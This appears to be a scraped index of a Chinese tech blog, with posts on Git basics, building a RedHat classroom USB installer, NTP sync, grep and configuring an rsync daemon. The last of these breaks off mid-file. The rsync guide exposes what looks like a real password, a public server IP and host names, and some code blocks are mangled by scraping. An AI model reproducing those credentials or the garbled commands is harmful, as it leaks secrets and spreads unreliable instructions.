占地面积小，具有闪电般的快速性能。它具有诸如Subversion，CVS，Perforce和ClearCase之类的SCM工具，并且具有廉价的本地分支，方便的暂存区域和 多个工作流等功能。 版本控制的历史及作用版本控制的作用： 对于IT这个行业来说，经常会遇到一个问题：代码分散的拷贝在各个分区之中，不知道哪个代码文件是最新的，哪个代码文件是最优的。失败的复制、替换经常会导致原来尚能运行的代码遭到破坏。于是，针对以上的问题就产生了一种解决方案，这种方案我们成为版本控制。版本控制系统是能够随着时间的推进记录一系列文件的变化以便于你以后想要的退回到某个版本的系统。 版本控制的历史： 1）CVS：最早期的版本控制工具称为CVS，于1985年由荷兰阿姆斯特丹VU大学的Dick Grune教授完成开发，奠定了后续版本控制软件的模型基础。CVS采用C/S模型，版本库位于服务端，实际上存储的文件可以理解为一个RCS容器。每一个RCS文件以’.v‘作为后缀，保存该文件的每一次更改历史，使得其存储十分有效。然而CVS也存在如下缺点：1.效率不高，服务端文件越多，处理速度越慢。2.合并困难重重，经常会遇到严重冲突。3.不能直接对文件和目录的重命名进行版本控制，会破坏数据。 2）SVN：SVN全名为subversion，由collabNet公司于2000年开发，目的是为了弥补CVS的不足，创建一个性能更加强大的版本控制系统来取代CVS。到了2001年的时候，SVN已经可以用于市场环境。SVN拥有以下几个特征：1.轻量级拷贝。2.以授权文件的方式来实现版本库的授权。2.在工作区的隐藏目录下会保存一份冗余的原始拷贝。然而，SVB比起CVS在本质上并没有突破。到2009年年底，SVN被交由APACHE社区管理，至此svn成为了apache的一个子项目。 3）GIT：GIT由linux之父linus于2005年开发，在结构上比起SVN和CVS有很大的提升。可以说GIT是世界上目前最优秀的版本控制系统之一。GIT的每个功能都作为一条独立的命令，导致git庞大的命令集，但这并不妨碍各大程序人员对于GIT的喜爱，原因就在于它一个分布式的版本控制系统。此外：GIT虽然是基于linux操作系统开发的，但目前已经可以跨平台运行在多种操作系统之上，包括linux，MAC OS X，Windows等。 版本控制系统的分类： 版本控制主要分为三大类：本地版本控制系统，集中式版本控制系统和分布式版本控制系统。 本地版本控制：将文件的各个版本以一定的数据格式存储在本地的磁盘，这种方式在一定的程度上解决了手动复制黏贴的问题，但无法解决多人协作的问题。 集中式版本控制：比起本地版本控制多了一个中央服务器，各个版本的数据存储在中央服务器，管理员可以控制开发人员的权限，而开发人员也可以从中央服务器拉取数据。集中式版本控制解决了团队协作问题，但缺点是所有数据存储在中央服务器，服务器一旦宕机，会造成不可估量的损失。SVN和CVS都是集中式版本控制。 分布式版本控制，系统保存的不是文件变化的差两，而是文件的快照。分布式版本控制系统是分布式的，当你从中央服务器拷贝下来代码时，你拷贝的是一个完整的版本库，包括历史纪录，提交记录等，即使某一台机器宕机，也能够找到文件的完整备份。GIT就是分布式版本控制。 GIT的安装git该软件光盘自带，直接通过yum的方式去安装即可，目前我们采用的git版本是1.8.3.1版本。 123[root@servera ~]# yum -y install git[root@servera ~]# git --versiongit version 1.8.3.1 可以通过以下方式完成命令补全： 12[root@servera ~]# cp /usr/share/doc/git-1.8.3.1/contrib/completion/git-completion.bash /etc/bash_completion.d[root@servera ~]# source /etc/bash_completion.d/git-completion.bash GIT的初始化1）设置下git的配置变量，告诉git当前用户的姓名和邮件地址，配置的用户名和邮件地址将会在版本库提交时候用到。 12[root@servera .git]# git config --global user.name &quot;carol&quot;[root@servera .git]# git config --global user.email lijiayi@uplooking.com 2）创建工作目录并初始化 1234567[root@servera ~]# cd /root[root@servera ~]# lsanaconda-ks.cfg[root@servera ~]# mkdir workspace[root@servera ~]# cd workspace/[root@servera workspace]# git initInitialized empty Git repository in /root/workspace/.git/ 这里/root/workspace目录就是工作区。git ini为初始化命令，在执行完成之后会在该目录下生成一个.git的版本库。 第一次提交文件1）先在工作区生成一个文件 12345[root@servera workspace]# echo hello &gt; welcome.txt[root@servera workspace]# lswelcome.txt[root@servera workspace]# cat welcome.txthello 2）为了将这个新建立的文件添加到版本库，需要执行以下指令 12345[root@servera workspace]# git add welcome.txt[root@servera workspace]# git commit -m &quot;first&quot;[master c5171b5] first 1 file changed, 1 insertion(+) create mode 100644 welcome.txt GIT的工作区、暂存区、版本库 在这里有三个概念。1.工作区 2.版本库 3.暂存区 实际上在上一个实践之中，我们经历了两次提交，主要和这个设计模式有关。 当工作区执行git add命令时，咱群出的目录树将被更新，同时工作区的文件内容会被写入到对象库中的一个新的对象中，而该对象的ID被记录在暂存区的文件索引中。 当执行git commit操作时候，暂存区的目录树会写到版本库中，最新指向的目录树就是提交时暂存区的目录树。 实际上，暂存区局像是一个虚拟的工作区，在这个虚拟工作区的目录树中，文件.git/index实际记录了文件名和文件的状态信息（时间戳、文件长度等等），文件的内容并没有实际存储其中，而是保存在了git对象库(.git/objects)中，文件索引建立起了对象库和实体对象之间的对应。图显示了工作区、暂存区和版本库之间的关系。 GIT的常用基本命令1）git diff：用来显示工作区和暂存区文件的差异 12345678910111213141516[root@servera workspace]# echo test &gt;&gt; welcome.txt[root@servera workspace]# lswelcome.txt[root@servera workspace]# cat welcome.txthellotest[root@servera workspace]# lswelcome.txt[root@servera workspace]# git diff welcome.txtdiff --git a/welcome.txt b/welcome.txtindex ce01362..b2b9cc9 100644--- a/welcome.txt+++ b/welcome.txt@@ -1 +1,2 @@ hello+test 2）git status：用来查看改过的内容 12345678910[root@servera workspace]# git status# On branch master# Changes not staged for commit:# (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)# (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)## modified: welcome.txt#no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)[root@servera workspace]# 3）git log： 用来查看历史提交的日志 123456[root@servera workspace]# git logcommit a7a778652b1457b838beeca66e4334c35d97e826Author: carol &lt;lijiayi@uplooking.com&gt;Date: Sun Nov 20 07:01:51 2016 -0500 first 4）git reset 用来做回滚 恢复工作区的文件到上一个提交的版本： 1234567891011121314151617[root@servera workspace]# echo test &gt;&gt; welcome.txt[root@servera workspace]# cat welcome.txthellotest[root@servera workspace]# git add welcome.txt[root@servera workspace]# git commit -m &quot;second&quot; # 以上的操作为再添加一个版本[master 0d10fd9] second 1 file changed, 1 insertion(+)[root@servera workspace]# cat welcome.txthellotest[root@servera workspace]# git reset --hard HEAD^ # ^代表上一个版本，^^代表上上一个版本，当然往上100个版本写100个^比较容易数不过来，所以可以写成HEAD~100HEAD is now at a7a7786 first[root@servera workspace]# lswelcome.txt[root@servera workspace]# cat welcome.txthello 恢复工作区到指定版本： 123456789101112131415[root@servera workspace]# echo testok &gt;&gt; welcome.txt[root@servera workspace]# echo testok &gt;&gt; welcome.txt[root@servera workspace]# git add welcome.txt[root@servera workspace]# git commit -m &quot;third&quot; # 这里再添加一个版本[master 3c3b1d9] third 1 file changed, 2 insertions(+)[root@servera workspace]# git log --graph --oneline # 可以通过该参数查看到每个操作对应的ID* 3c3b1d9 third* a7a7786 first[root@servera workspace]# git reset --hard a7a7786HEAD is now at a7a7786 first[root@servera workspace]# lswelcome.txt[root@servera workspace]# cat welcome.txthello 5）git reflog用来查看历史记录，可以结合reset完成恢复数据的操作 123456789101112131415161718[root@servera workspace]# git refloga7a7786 HEAD@{0}: reset: moving to a7a77863c3b1d9 HEAD@{1}: commit: thirda7a7786 HEAD@{2}: reset: moving to HEAD^0d10fd9 HEAD@{3}: commit: seconda7a7786 HEAD@{4}: reset: moving to HEAD^4d65b14 HEAD@{5}: commit: seconda7a7786 HEAD@{6}: commit (initial): first[root@servera workspace]# cat welcome.txthello[root@servera workspace]# git reset --hard HEAD@{1}HEAD is now at 3c3b1d9 third[root@servera workspace]# lswelcome.txt[root@servera workspace]# cat welcome.txthellotestoktestok 6）git checkout 可以丢弃工作区的修改 123456789101112131415[root@servera workspace]# echo carol &gt;&gt; welcome.txt[root@servera workspace]# git add welcome.txt[root@servera workspace]# cat welcome.txthellotestoktestokcarol #重新提交一个修改后的文件至工作区[root@servera workspace]# git reset HEAD welcome.txt #如果已经提交给缓存区，则必须要做这步Unstaged changes after reset:M welcome.txt[root@servera workspace]# git checkout -- welcome.txt[root@servera workspace]# cat welcome.txthellotestoktestok 7）git rm 从版本库中删除文件 12345678[root@servera workspace]# git rm welcome.txtrm &apos;welcome.txt&apos;[root@servera workspace]# git commit -m &quot;delete welcome&quot;[master ba79342] delete welcome 1 file changed, 3 deletions(-) delete mode 100644 welcome.txt[root@servera workspace]# ls[root@servera workspace]# ls GIT分支通常情况下，一套分支只用来存放一套代码，为了保证每套代码的独立性，我们会建立多个分支来分开管理。 查看分支 创建分支 切换分支 合并某分支到当前分支 删除分支 git branch git branch name git checkout name git merge name git branch -d name 12345678910111213141516171819202122232425262728293031323334353637[root@servera workspace]# git branch # 查看fenzhi* master[root@servera workspace]# git branch a #创建名为a的分支[root@servera workspace]# git branch a* master # * 代表当前分支[root@servera workspace]# git checkout a # 切换分支Switched to branch &apos;a&apos;[root@servera workspace]# git branch* a master[root@servera workspace]# echo test &gt; testfile[root@servera workspace]# git add testfile[root@servera workspace]# git commit -m &apos;a&apos;　　# 重新提交个文件[a 92abcd8] a 1 file changed, 1 insertion(+) create mode 100644 testfile[root@servera workspace]# lstestfile[root@servera workspace]# git status # 可以看到已经提交给了a这个分支# On branch anothing to commit, working directory clean[root@servera workspace]# cd .git/[root@servera .git]# lsbranches config HEAD index logs ORIG_HEADCOMMIT_EDITMSG description hooks info objects refs[root@servera .git]# cat HEADref: refs/heads/a # 可以看到当前分支头部指向了a[root@servera workspace]# git checkout masterSwitched to branch &apos;master&apos;[root@servera workspace]# git merge a # 合并分支，不建议这样做，可能会有冲突。Updating ba79342..92abcd8Fast-forward testfile | 1 + 1 file changed, 1 insertion(+) create mode 100644 testfile GIT克隆git克隆的作用：备份，在分布式的集中化管理机制里，就可以通过克隆的方式，将远程的git版本库克隆至本地来进行修改。 1）克隆 123456[root@servera ~]# git clone /root/workspace/ /backupCloning into &apos;/backup&apos;...done.[root@servera ~]# cd /backup/[root@servera backup]# lstestfile 2）拉取和推送 1234567891011121314151617181920212223242526272829303132333435363738推送：[root@servera workspace]# git push /backupwarning: push.default is unset; its implicit value is changing inGit 2.0 from &apos;matching&apos; to &apos;simple&apos;. To squelch this messageand maintain the current behavior after the default changes, use: git config --global push.default matchingTo squelch this message and adopt the new behavior now, use: git config --global push.default simpleSee &apos;git help config&apos; and search for &apos;push.default&apos; for further information.(the &apos;simple&apos; mode was introduced in Git 1.7.11. Use the similar mode&apos;current&apos; instead of &apos;simple&apos; if you sometimes use older versions of Git)Counting objects: 4, done.Delta compression using up to 2 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 272 bytes | 0 bytes/s, done.Total 3 (delta 0), reused 0 (delta 0)remote: error: refusing to update checked out branch: refs/heads/masterremote: error: By default, updating the current branch in a non-bare repositoryremote: error: is denied, because it will make the index and work tree inconsistentremote: error: with what you pushed, and will require &apos;git reset --hard&apos; to matchremote: error: the work tree to HEAD.remote: error:remote: error: You can set &apos;receive.denyCurrentBranch&apos; configuration variable tremote: error: &apos;ignore&apos; or &apos;warn&apos; in the remote repository to allow pushing intremote: error: its current branch; however, this is not recommended unless youremote: error: arranged to update its work tree to match what you pushed in somremote: error: other way.remote: error:remote: error: To squelch this message and still keep the default behaviour, seremote: error: &apos;receive.denyCurrentBranch&apos; configuration variable to &apos;refuse&apos;.To /backup ! [remote rejected] master -&gt; master (branch is currently checked out)error: failed to push some refs to &apos;/backup&apos; 报错的原因： 默认更新非裸版本库的当前分支是不被允许的，因为这样会导致暂存区和工作区与你推送至版本库的新提交不一致。太古怪了。 1234567891011121314拉取：[root@servera workspace]# cd /backup[root@servera backup]# lstestfile[root@servera backup]# git pull /root/workspace/From /root/workspace * branch HEAD -&gt; FETCH_HEADUpdating 92abcd8..3191ffcFast-forward hello | 1 + 1 file changed, 1 insertion(+) create mode 100644 hello[root@servera backup]# lshello testfile 9.GITHUB的使用GitHub 是一个面向开源及私有软件项目的托管平台，因为只支持 Git 作为唯一的版本库格式进行托管，故名 GitHub 网站地址：https://github.com/ 将本地版本库上传至github保存 先打开github，自行注册 在github上通过图形化界面配置一个版本库 将本地的版本库通过push的方式上传至远程 123456789101112[root@servera backup]# git remote add carol https://github.com/atheling004/test1.git #添加执行用户[root@servera backup]# git push -u carol masterUsername for &apos;https://github.com&apos;: atheling004Password for &apos;https://atheling004@github.com&apos;: # 输入用户名和密码Counting objects: 4, done.Delta compression using up to 2 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (4/4), 248 bytes | 0 bytes/s, done.Total 4 (delta 0), reused 0 (delta 0)To https://github.com/atheling004/test1.git * [new branch] master -&gt; masterBranch master set up to track remote branch master from carol. 查看结果 2）将远程github版本库中保存的文件存放至本地 1.现在github上通过create new file选项自行创建一个新文件，这里创建的文件名称为zazazazazazaza 2.执行以下操作 1234567891011121314[root@servera backup]# git pull https://github.com/atheling004/test1.gitremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From https://github.com/atheling004/test1 * branch HEAD -&gt; FETCH_HEADUpdating 92a7721..33a62baFast-forward zazazazazazaza | 1 + 1 file changed, 1 insertion(+) create mode 100644 zazazazazazaza[root@foundation0 workspace]# lshello testfile zazazazazazaza 3.github的版本克隆（即远程版本克隆） 123456789101112131415[root@foundation0 ~]# mkdir /test[root@foundation0 ~]# cd /test/[root@foundation0 test]# ls[root@foundation0 test]# git clone https://github.com/atheling004/test1.gitCloning into &apos;test1&apos;...remote: Counting objects: 7, done.remote: Compressing objects: 100% (4/4), done.remote: Total 7 (delta 1), reused 3 (delta 0), pack-reused 0Unpacking objects: 100% (7/7), done.[root@foundation0 test]# lstest1[root@foundation0 test]# cd test1/[root@foundation0 test1]# lshello testfile zazazazazazaza[root@foundation0 test1]# 4.在本地版本库发生变更后上传 1234567891011121314151617181920212223242526272829[root@foundation0 test1]# cat 1testfile[root@foundation0 test1]# git add 1[root@foundation0 test1]# git commit -m 1[root@foundation0 test1]# git push https://github.com/atheling004/test1.gitwarning: push.default is unset; its implicit value is changing inGit 2.0 from &apos;matching&apos; to &apos;simple&apos;. To squelch this messageand maintain the current behavior after the default changes, use: git config --global push.default matchingTo squelch this message and adopt the new behavior now, use: git config --global push.default simpleSee &apos;git help config&apos; and search for &apos;push.default&apos; for further information.(the &apos;simple&apos; mode was introduced in Git 1.7.11. Use the similar mode&apos;current&apos; instead of &apos;simple&apos; if you sometimes use older versions of Git)Username for &apos;https://github.com&apos;: atheling004Password for &apos;https://atheling004@github.com&apos;:Counting objects: 4, done.Delta compression using up to 2 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 252 bytes | 0 bytes/s, done.Total 3 (delta 1), reused 0 (delta 0)remote: Resolving deltas: 100% (1/1), completed with 1 local objects.To https://github.com/atheling004/test1.git 33a62ba..85c6527 master -&gt; master 结果如下","link":"/2019/05/13/booboo_others/2020-05-12-tec-git/"},{"title":"制作RedHat教学系统装机U盘","text":"红帽官方教学系统 格式化u盘12345678910111213141516171819202122232425[root@foundation0 ~]# mount |tail -n 1/dev/sdb1 on /run/media/kiosk/U type vfat (rw,nosuid,nodev,relatime,uid=1000,gid=1000,fmask=0022,dmask=0077,codepage=437,iocharset=ascii,shortname=mixed,showexec,utf8,flush,errors=remount-ro,uhelper=udisks2)[root@foundation0 ~]# umount /dev/sdb1[root@foundation0 ~]# partprobe /dev/sdb1[root@foundation0 ~]# mkfs.ext4 /dev/sdb1mke2fs 1.42.9 (28-Dec-2013)Filesystem label=OS type: LinuxBlock size=4096 (log=2)Fragment size=4096 (log=2)Stride=0 blocks, Stripe width=0 blocks932064 inodes, 3722784 blocks186139 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=2151677952114 block groups32768 blocks per group, 32768 fragments per group8176 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208Allocating group tables: done Writing inode tables: done Creating journal (32768 blocks): doneWriting superblocks and filesystem accounting information: done 制作u盘启动123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@foundation0 ~]# rht-usb usbformat /dev/sdb1INFO Configuration file: /root/.icrm/config.ymlINFO Formatting USB Device: /dev/sdb1Confirm reformatting /dev/sdb1 (y/N) yINFO mkfs.ext4 64-bit supportINFO /dev/sdb1: format OKINFO Appear to have properly formatted USB device.[root@foundation0 ~]# cd /home/kiosk/booboo/cache[root@foundation0 cache]# lltotal 4038772-rw------- 1 kiosk kiosk 27967 Mar 3 2016 ClassPrep-7.x-4.r35344.txt-rw------- 1 kiosk kiosk 16186 Mar 3 2016 ClassroomReset-7.x-4.r35344.txt-rw------- 1 kiosk kiosk 38605 Mar 3 2016 ClassroomSetup-7.x-4.r35344.txt-rw------- 1 kiosk kiosk 27054 Mar 3 2016 ClassroomTroubleshooting-7.x-4.r35344.txt-rw------- 1 kiosk kiosk 75892 Mar 3 2016 foundation0-config-7.x-4.r35344.noarch.rpm-rw------- 1 kiosk kiosk 27568 Mar 3 2016 foundation-config-7.x-4.r35344.noarch.rpm-rw------- 1 kiosk kiosk 189984 Mar 3 2016 redhat-survey-7.x-55.1.noarch.rpm-rw------- 1 kiosk kiosk 91254784 Mar 4 2016 rhci-foundation-7.2-4.r35344.iso-rw------- 1 kiosk kiosk 2775 May 9 11:02 RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmf-rw------- 1 kiosk kiosk 621805 Oct 20 2014 RHEL7和CentOS7打开屏幕VNC.pdf-rw------- 1 kiosk kiosk 4043309056 Mar 4 2016 rhel-server-7.2-x86_64-dvd.iso-rw------- 1 kiosk kiosk 96050 Mar 3 2016 rht-usb-7.x-4.r35344[root@foundation0 cache]# vim /root/.icrm/config.yml---repository: /root/.icrm/repositoryrepository: /home/kiosk/booboo/cache[root@foundation0 cache]# rht-usb verify *.icmfINFO Configuration file: /root/.icrm/config.ymlINFO Verifying Cache Directory: /home/kiosk/booboo/cacheVerifying manifest file RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmf Publish date: 2016-02-24 20:43:25 type md5sum artifact-name ----------- ------- ----------------------------------------------- content CORRUPT rhel-server-7.2-x86_64-dvd.iso content GOODSUM foundation-config-7.x-4.r35344.noarch.rpm content GOODSUM foundation0-config-7.x-4.r35344.noarch.rpm content GOODSUM redhat-survey-7.x-55.1.noarch.rpm content GOODSUM rhci-foundation-7.2-4.r35344.iso content GOODSUM rht-usb-7.x-4.r35344 content GOODSUM ClassroomSetup-7.x-4.r35344.txt content GOODSUM ClassroomReset-7.x-4.r35344.txt content GOODSUM ClassroomTroubleshooting-7.x-4.r35344.txt content GOODSUM ClassPrep-7.x-4.r35344.txt content GOODSUM RHEL7和CentOS7打开屏幕VNC.pdf=====================================================================WARNING Manifest RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmf failed.WARNING Verification FAILED - look above for problem[root@foundation0 cache]# rht-usb usbadd RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmfINFO Configuration file: /root/.icrm/config.ymlINFO Adding to USB: RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmfINFO New files needed space is 3.9G out of 3.9GINFO Calculation finds we need: 4135687726 bytes (3.9G)INFO USB space Total: 14.2G Used: 35.5M Free: 13.4GINFO Starting copy of RHCIfoundation-RHEL72-4.r35344.1-ILT-7-en_US.icmfINFO Copying artifact: rhel-server-7.2-x86_64-dvd.isoINFO Copying /home/kiosk/booboo/cache/rhel-server-7.2-x86_64-dvd.iso (3.8G) to /tmp/tmpKRYNm9/rhel7.2/x86_64/isos/rhel-server-7.2-x86_64-dvd.isorht-usb usbmkboot","link":"/2020/05/13/booboo_others/2020-05-12-tec-redhat/"},{"title":"Linux系统一次性同步时间","text":"测试服务器物理时间和系统时间都不正确，需要调整 步骤123456# 安装 ntp yum install -y ntp# 同步阿里云时间同步服务器ntpdate ntp1.aliyun.com# 物理时间同步系统时间hwclock -w","link":"/2020/05/14/booboo_others/2020-05-12-tec-linux/"},{"title":"团队家庭聚餐日","text":"上海重大突发公共卫生应急响应降到三级后第一次家庭聚餐日，超开心哟，感谢大家☔️ 赶过来宝宝们也超兴奋哈(✪▽✪) 家庭聚餐之三驾马车：聚餐 勒  ，桌游 ，带娃 聚餐：大家都带了新鲜的水果蔬菜肉肉牛奶 ，吃的开心又健康 桌游 ：感谢珏男同学带大家入门哈(✪▽✪)人多好玩的游戏，玩的过程中大人的声音   壘 已完全覆盖萌娃(//∇//)\\，娃娃们多次表示抗议！“你们太吵啦” 带娃 ：果果的笑声太有感染力了，她还穿上俺的雨靴，俨然成为小大人哈；睿睿跟着switch的舞蹈游戏跳爵士舞，那手势，那屁股，引得全场掌声不断；小慈帮妈妈上菜分担家务，带弟弟妹妹玩，已成为大姐姐～(￣▽￣～)~只是还有些害羞和依恋妈妈o(≧v≦)o 期待下次去静雪家的庭院烧烤哈","link":"/2020/05/18/amy_life/2020-05-18-amy/"},{"title":"记一次grep命令常用方法带文件名和行数","text":"需求找到指定目录中的所有文件中包含字符nav-item dropdown的文件和行数。 命令1for i in $(find `pwd` -type f); do grep -H -n &quot;2020-05-19&quot; $i; done 2&gt; /dev/null","link":"/2020/05/19/booboo_others/2020-05-19-tec-linux/"},{"title":"rsync + inotify 实现实时同步","text":"rsync介绍rsync，remote synchronize顾名思意就知道它是一款实现远程同步功能的软件，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。 rsync是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，而且可以通过ssh方式来传输文件，这样其保密性也非常好，另外它还是免费的软件。 RSYNC六种命令格式Rsync的命令格式可以为以下六种： 123456rsync [OPTION]... SRC DEST　　rsync [OPTION]... SRC [USER@]HOST:DEST　　rsync [OPTION]... [USER@]HOST:SRC DEST　　rsync [OPTION]... [USER@]HOST::SRC DEST　　rsync [OPTION]... SRC [USER@]HOST::DEST　　rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST] 对应于以上六种命令格式，rsync有六种不同的工作模式： 拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号”:”分隔符时就启动这种工作模式。如：rsync -a /data /backup 使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号”:”分隔符时启动该模式。如：rsync -avz *.c foo:src 使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号”:”分隔符时启动该模式。如：rsync -avz foo:src/bar /data 从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含”::”分隔符时启动该模式。如：rsync -av root@172.16.78.192::www /databack 从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含”::”分隔符时启动该模式。如：rsync -av /databack root@172.16.78.192::www 列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://172.16.78.192/www RSYNC安装123456789#注：在debian、ubuntu 等在线安装方法；sudo apt-get install rsync #注：Fedora、Redhat 等在线安装方法；yum install rsync #注：Fedora、Redhat 等rpm包安装方法；rpm -ivh rsync RSYNC案例在我们内部跳板机1：杭州节点（主）中，对应在“/etc/ssh/ssh_config.d”中配置了每个项目的ssh快捷登陆，所以后续我们只需要“ssh &lt;主机名&gt;”便能登陆到对应的目标服务器中。但这里有个问题，我们在杭州节点（主）中，对应变更了“/etc/ssh/ssh_config.d”的配置，那其他跳板机怎么样同步更新呢？其实这里我们采用了rsync的方式来同步配置文件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# rsync server配置# 1.在内部跳板机1：杭州节点（主：srv-zy-ssh1）上，编辑配置文件/etc/rsyncd.confuid=rootgit=rootuse chroot=nomax connection=0port=873pid file=/var/log/rsync/rsyncd.pidlock file=/var/log/rsync/rsync.locklog file=/var/log/rsync/rsyncd.logmotd file=/var/log/rsync/rsyncd.motdstrict modes=yes[sshconfig]uid=rootgit=rootpath=/etc/ssh/ssh_config.d/comment=rsync ssh_configread only=falselist=falsehost allow=ip1 ip2 ip3 #hosts deny=172.25.0.0/24auth users=sshconfigsecrets file=/etc/rsyncd.passwd#2.编辑/etc/rsyncd.passwd 文件加入以下内容sshconfig:rsync20150128#3.赋权（必须600权限，否则报错）chmod 600 /etc/rsyncd.passwd#4.启动rsyncrsync --daemon /etc/rsyncd.conf# rsync cilent配置分别在其他跳板机上面：内部跳板机2：青岛节点（备：srv-zy-ssh2）客户跳板机1：杭州节点（主：srv-zy-ssh3）客户跳板机2：青岛节点（备：srv-zy-ssh4）# 编辑/etc/rsyncd.passwd 文件加入以下内容：sshconfig:rsync20150128# 赋权（必须600权限，否则报错）:chmod 600 /etc/rsyncd.passwd# 执行同步命令：rsync -vzrtopg --delete --progress sshconfig@115.29.244.224::sshconfig /etc/ssh/ssh_config.d/ --password-file=/etc/rsyncd.passwd或者：rsync -avz --delete --progress sshconfig@115.29.244.224::sshconfig /etc/ssh/ssh_config.d/ --password-file=/etc/rsyncd.passwd RSYNC参数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859rsync参数的具体解释如下：-v, --verbose 详细模式输出-q, --quiet 精简输出模式-c, --checksum 打开校验开关，强制对文件传输进行校验-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD-r, --recursive 对子目录以递归模式处理-R, --relative 使用相对路径信息-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。--backup-dir 将备份文件(如~filename)存放在在目录下。-suffix=SUFFIX 定义备份文件前缀-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件)-l, --links 保留软链结-L, --copy-links 想对待常规文件一样处理软链结--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结--safe-links 忽略指向SRC路径目录树以外的链结-H, --hard-links 保留硬链结 -p, --perms 保持文件权限-o, --owner 保持文件属主信息 -g, --group 保持文件属组信息-D, --devices 保持设备文件信息 -t, --times 保持文件时间信息-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间-n, --dry-run现实哪些文件将被传输-W, --whole-file 拷贝文件，不进行增量检测-x, --one-file-system 不要跨越文件系统边界-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节-e, --rsh=COMMAND 指定使用rsh、ssh方式进行数据同步--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件--delete 删除那些DST中SRC没有的文件--delete-excluded 同样删除接收端那些被该选项指定排除的文件--delete-after 传输结束以后再删除--ignore-errors 及时出现IO错误也进行删除--max-delete=NUM 最多删除NUM个文件--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输--force 强制删除目录，即使不为空--numeric-ids 不将数字的用户和组ID匹配为用户名和组名--timeout=TIME IP超时时间，单位为秒-I, --ignore-times 不跳过那些有同样的时间和长度的文件--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0-T --temp-dir=DIR 在DIR中创建临时文件--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份-P 等同于 --partial--progress 显示备份过程-z, --compress 对备份的文件在传输时进行压缩处理--exclude=PATTERN 指定排除不需要传输的文件模式--include=PATTERN 指定不排除而需要传输的文件模式--exclude-from=FILE 排除FILE中指定模式的文件--include-from=FILE 不排除FILE指定模式匹配的文件--version 打印版本信息--address 绑定到特定的地址--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件--port=PORT 指定其他的rsync服务端口--blocking-io 对远程shell使用阻塞IO-stats 给出某些文件的传输状态--progress 在传输时现实传输过程--log-format=formAT 指定日志文件格式--password-file=FILE 从FILE中得到密码--bwlimit=KBPS 限制I/O带宽，KBytes per second-h, --help 显示帮助信息 应用场景在我们的日常场景中经常会经常碰到文件共享同步的问题，比如： 集群，提供高可用服务（需要网站代码或者目录实时同步，保证数据的一致性） 迁移数据 (实时增量传输) 文件备份（实时将数据备份到其他设备，防止数据丢失） 我们针对以上场景在 Linux 系统下实现文件实时同步 rsync案例1Server端配置环境介绍修改：调整了目录顺序 1操作系统：CentOS 6.8 rsync: rsync-3.0.6 (yum 源默认安装) 安装方式安装方式 1sudo` `apt-get ``install` `rsync` `#debian、ubuntu 等在线安装方法；``yum ``install` `rsync` `#Fedora、Redhat 等在线安装方法；``rpm -ivh ``rsync` `# Fedora、Redhat 等rpm包安装方法；``rpm -qa | ``grep` `rsync` `# 查看安装的版本 配置修改： 文件名缺少“d” 字符 12chmod 600 /etc/rsync.d/rsyncd.conf chmod 600 /etc/rsync.d/rsyncd.pass 创建相关配置目录和文件 1mkdir` `-p ``/etc/rsync``.d ``# rsync 配置文件目录，默认没有` `touch` `/etc/rsync``.d``/rsyncd``.conf ``# rsync服务端配置文件` `touch` `/etc/rsync``.d``/rsyncd``.pass ``# 客户端拉取文件时使用的用户密码` `chmod` `600 ``/etc/rsync``.d``/rsyncd``.conf` `chmod` `600 ``/etc/rsync``.d``/rsyncd``.pass 编写主配置文件 rsyncd.conf1vim ``/etc/rsync``.d``/rsyncd``.conf （以下是配置文件） 1234567891011121314151617181920212223242526272829303132333435log file=/var/log/rsyncd.logpid file=/var/run/rsyncd.pidlock file=/var/run/rsyncd.lockmotd file = /etc/rsyncd/rsyncd.motduid=rootgid=rootmax connections=5hosts allow=192.168.1.167 # 允许访问的IP地址，我这里填写的是测试的客户端地址hosts deny=*secrets file = 